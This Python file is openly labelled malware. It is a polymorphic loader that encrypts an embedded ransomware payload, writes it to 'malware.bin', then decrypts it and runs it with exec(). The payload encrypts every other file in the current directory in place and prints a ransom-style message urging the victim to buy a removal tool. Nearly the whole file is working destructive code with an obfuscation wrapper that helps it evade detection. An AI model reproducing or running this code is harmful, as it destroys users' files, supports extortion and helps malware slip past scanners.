from cryptography.fernet import Fernet
import os

def generate_key():
    return Fernet.generate_key()

def encrypt_code(key, code):
    cipher = Fernet(key)
    return cipher.encrypt(code.encode())

def decrypt_and_execute(key, encrypted_code):
    cipher = Fernet(key)
    decrypted_code = cipher.decrypt(encrypted_code).decode()
    exec(decrypted_code)

# Original malicious payload
payload = """
#This code is an example of Ransomware 
#https://github.com/amiroooamiran/Malware-with-python/
from cryptography.fernet import Fernet
import os
files = []

for file in os.listdir():

    if file == "metamorphic_malware.py" or file == "secret.key" \
      or file == "polymorphic_malware.py" or file == "" or \
      file == "malware.bin" or file == "polymorphic_loader.py":
        continue

    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()
with open("secret.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
print("************************************")
print("All of you file have been encrypted!!!") 
print("your computer is infected...")
print("buy NobleCleaner from tiny.url")
print("to remove malware and restore your files")
print("************************************")
"""

# Generate a new key
key = generate_key()

# Encrypt the payload
encrypted_payload = encrypt_code(key, payload)

# Simulate saving to a file (appearance changes here)
with open("malware.bin", "wb") as f:
    f.write(key + b"\n" + encrypted_payload)

# Simulate execution from the binary
with open("malware.bin", "rb") as f:
    key, encrypted_payload = f.read().split(b"\n", 1)
    decrypt_and_execute(key, encrypted_payload)
